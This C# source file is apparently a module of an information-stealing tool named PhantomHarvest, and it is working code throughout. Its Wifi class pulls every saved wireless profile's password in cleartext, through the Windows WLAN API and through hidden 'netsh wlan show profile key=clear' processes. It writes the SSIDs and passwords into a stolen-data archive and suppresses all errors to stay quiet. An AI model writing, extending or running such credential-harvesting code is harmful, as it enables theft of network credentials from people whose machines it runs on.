using System;
using System.IO;
using System.Text;
using System.Xml;
using PhantomHarvest.Helper;

namespace PhantomHarvest.SystemInfos
{
	// Token: 0x02000011 RID: 17
	internal class Wifi
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				StringBuilder sb = new StringBuilder();
				
				// 1. 尝试 WlanAPI
				string apiResult = Wifi.GetMessage();
				if (!string.IsNullOrEmpty(apiResult))
				{
					sb.AppendLine("=== WlanAPI Result ===");
					sb.AppendLine(apiResult);
				}
				
				// 2. 尝试 netsh 回退
				try
				{
					System.Diagnostics.Process p = new System.Diagnostics.Process();
					p.StartInfo.FileName = "netsh";
					p.StartInfo.Arguments = "wlan show profiles";
					p.StartInfo.UseShellExecute = false;
					p.StartInfo.RedirectStandardOutput = true;
					p.StartInfo.CreateNoWindow = true;
					p.Start();
					
					string profilesOutput = p.StandardOutput.ReadToEnd();
					p.WaitForExit();
					
					if (!string.IsNullOrEmpty(profilesOutput))
					{
						sb.AppendLine("\n=== Netsh Result ===");
						foreach (string line in profilesOutput.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
						{
							if (line.Contains(" : "))
							{
								string profileName = line.Substring(line.LastIndexOf(" : ") + 3).Trim();
								try
								{
									System.Diagnostics.Process p2 = new System.Diagnostics.Process();
									p2.StartInfo.FileName = "netsh";
									p2.StartInfo.Arguments = "wlan show profile name=\"" + profileName + "\" key=clear";
									p2.StartInfo.UseShellExecute = false;
									p2.StartInfo.RedirectStandardOutput = true;
									p2.StartInfo.CreateNoWindow = true;
									p2.Start();
									
									string profileDetail = p2.StandardOutput.ReadToEnd();
									p2.WaitForExit();
									
									string password = "Not Found";
									foreach (string detailLine in profileDetail.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
									{
										if (detailLine.Contains("Key Content") || detailLine.Contains("关键内容"))
										{
											password = detailLine.Substring(detailLine.LastIndexOf(" : ") + 3).Trim();
											break;
										}
									}
									sb.AppendLine("SSID: " + profileName);
									sb.AppendLine("Password: " + password);
									sb.AppendLine("----------------------------");
								}
								catch {}
							}
						}
					}
				}
				catch {}
				
				if (sb.Length > 0)
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(sb.ToString())))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, Wifi.SystemInfoName + "/wifi.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		private static string GetMessage()
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			IntPtr zero3 = IntPtr.Zero;
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				IntPtr intPtr;
				Win32Api.WlanOpenHandle(2, IntPtr.Zero, out intPtr, ref zero);
				Win32Api.WlanEnumInterfaces(zero, IntPtr.Zero, ref zero2);
				Guid interfaceGuid = new Win32Api.WLAN_INTERFACE_INFO_LIST(zero2).InterfaceInfo[0].InterfaceGuid;
				Win32Api.WlanGetProfileList(zero, interfaceGuid, IntPtr.Zero, ref zero3);
				Win32Api.WLAN_PROFILE_INFO_LIST wlan_PROFILE_INFO_LIST = new Win32Api.WLAN_PROFILE_INFO_LIST(zero3);
				if (wlan_PROFILE_INFO_LIST.dwNumberOfItems <= 0)
				{
					return null;
				}
				stringBuilder.AppendLine("Found " + wlan_PROFILE_INFO_LIST.dwNumberOfItems.ToString() + " SSIDs: ");
				stringBuilder.AppendLine("============================");
				stringBuilder.AppendLine("");
				for (int i = 0; i < wlan_PROFILE_INFO_LIST.dwNumberOfItems; i++)
				{
					try
					{
						string strProfileName = wlan_PROFILE_INFO_LIST.ProfileInfo[i].strProfileName;
						int num = 63;
						string xml;
						Win32Api.WlanGetProfile(zero, interfaceGuid, strProfileName, IntPtr.Zero, out xml, ref num, out intPtr);
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.LoadXml(xml);
						XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//*[name()='WLANProfile']/*[name()='SSIDConfig']/*[name()='SSID']/*[name()='name']");
						XmlNodeList xmlNodeList2 = xmlDocument.SelectNodes("//*[name()='WLANProfile']/*[name()='MSM']/*[name()='security']/*[name()='sharedKey']/*[name()='keyMaterial']");
						foreach (object obj in xmlNodeList)
						{
							XmlNode xmlNode = (XmlNode)obj;
							stringBuilder.AppendLine("SSID: " + xmlNode.InnerText);
							foreach (object obj2 in xmlNodeList2)
							{
								XmlNode xmlNode2 = (XmlNode)obj2;
								stringBuilder.AppendLine("Password: " + xmlNode2.InnerText);
							}
							stringBuilder.AppendLine("----------------------------");
						}
					}
					catch (Exception ex)
					{
						stringBuilder.AppendLine(ex.Message);
					}
				}
				Win32Api.WlanCloseHandle(zero, IntPtr.Zero);
			}
			catch
			{
			}
			return stringBuilder.ToString();
		}

		public static string SystemInfoName = "Wifi";
	}
}
